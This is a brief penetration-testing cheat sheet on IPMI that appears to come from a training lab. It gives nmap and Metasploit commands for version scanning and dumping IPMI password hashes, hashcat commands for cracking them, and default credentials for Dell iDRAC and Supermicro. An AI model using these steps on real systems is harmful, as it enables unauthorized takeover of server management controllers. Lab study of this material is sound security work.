[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`)

### Footprinting:

`$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local`

### Msfconsole Version Scan:

`msf6 > use auxiliary/scanner/ipmi/ipmi_version `

`msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195`

`msf6 auxiliary(scanner/ipmi/ipmi_version) > show options`

### Msfconsole Dump Hashes:

`msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes `

`msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195`

`msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options`

### Crack the hashes with hascat:

`hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`

`hashcat -m 7300 /tmp/1 /usr/share/wordlists/rockyou.txt` # or other wordlist

### Common or default logins:

| Product | Username | Password |
| --- |  --- |  --- |
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN | ADMIN |